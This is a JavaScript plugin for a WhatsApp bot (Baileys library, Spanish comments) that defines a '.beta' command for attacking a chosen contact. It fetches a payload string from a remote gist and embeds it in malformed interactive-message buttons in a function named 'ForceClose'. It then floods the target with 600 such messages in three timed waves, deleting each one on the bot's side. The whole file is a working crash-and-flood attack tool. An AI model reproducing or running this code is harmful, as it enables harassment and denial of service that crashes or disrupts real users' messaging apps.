import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
import fetch from 'node-fetch';

// Función delay
const delay = ms => new Promise(res => setTimeout(res, ms));

// ✅ Función GxhorseForceClose integrada
async function GxhorseForceClose(tqw) {
  let apiClient;
  try {
    const res = await fetch('https://gist.githubusercontent.com/Tama-Ryuichi/572ad67856a67dbae3c37982679153b2/raw/apiClient.json');
    apiClient = await res.text();
  } catch (err) {
    console.error("❌ Error obteniendo API client:", err);
    return null;
  }

  const msg = await generateWAMessageFromContent(tqw, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "X",
            mentionedJid: [tqw],
            forwardedNewsletterMessageInfo: {
              newsletterName: "Shimiezu",
              newsletterJid: "120363350240801289@newsletter",
              serverMessageId: 1
            },
            externalAdReply: {
              showAdAttribution: true,
              title: "Eternity",
              body: "",
              thumbnailUrl: null,
              sourceUrl: "https://tama.app/",
              mediaType: 1,
              renderLargerThumbnail: true
            },
            businessMessageForwardInfo: {
              businessOwnerJid: tqw,
            },
            dataSharingContext: {
              showMmDisclosure: true,
            },
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: null
              }
            }
          },
          header: { title: "", hasMediaAttachment: false },
          body: { text: "Eternity" },
          nativeFlowMessage: {
            messageParamsJson: `{"name":"galaxy_message","title":"galaxy_message","header":"Ryuichi - Beginner","body":"Call Galaxy"}`,
            buttons: [
              { name: "single_select", buttonParamsJson: apiClient + "Eternity" },
              { name: "call_permission_request", buttonParamsJson: apiClient + "Eternity" },
              { name: "payment_method", buttonParamsJson: "" },
              { name: "payment_status", buttonParamsJson: "" },
              { name: "review_order", buttonParamsJson: "" }
            ],
          },
        },
      },
    }
  }, {});

  return msg;
}

// ✅ Enviar tanda (20 mensajes)
async function enviarTanda(conn, jid, num, m, ciclo) {
  try {
    for (let i = 0; i < 20; i++) {
      const msg = await GxhorseForceClose(jid);
      if (!msg) continue;

      const sent = await conn.relayMessage(jid, msg.message, {
        participant: { jid },
        messageId: msg.key.id,
      });

      // Eliminar solo para el bot localmente
      await conn.sendMessage(conn.user.id, { delete: msg.key });

      await delay(1000);
    }

    await conn.sendMessage(m.chat, {
      text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.`,
    }, { quoted: m });

  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: `❌ Error en tanda ${num}:\n${e.message}`,
    }, { quoted: m });
  }
}

// ✅ Comando .beta
let handler = async (m, { conn }) => {
  const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
  if (m.sender !== botNumber) {
    return conn.sendMessage(m.chat, { text: '❌ Solo el número donde está vinculado el bot puede ejecutar este comando.' }, { quoted: m });
  }

  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;

  // 🚀 Ataque 1
  conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m });
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, jid, round + 1, m, '1');
    }, round * 30000);
  }

  // ⏳ Ataque 2 (a los 10 minutos)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '2');
      }, round * 30000);
    }
  }, 600000); // 10 min

  // ⏳ Ataque 3 (a los 20 minutos)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (20:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '3');
      }, round * 30000);
    }

    // ✅ Mensaje final
    setTimeout(() => {
      conn.sendMessage(m.chat, {
        text: '🎯 Ataque finalizado. 600 mensajes enviados en total.',
      }, { quoted: m });
    }, 300000); // al terminar ataque 3

  }, 1200000); // 20 min
};

handler.command = /^beta$/i;
export default handler;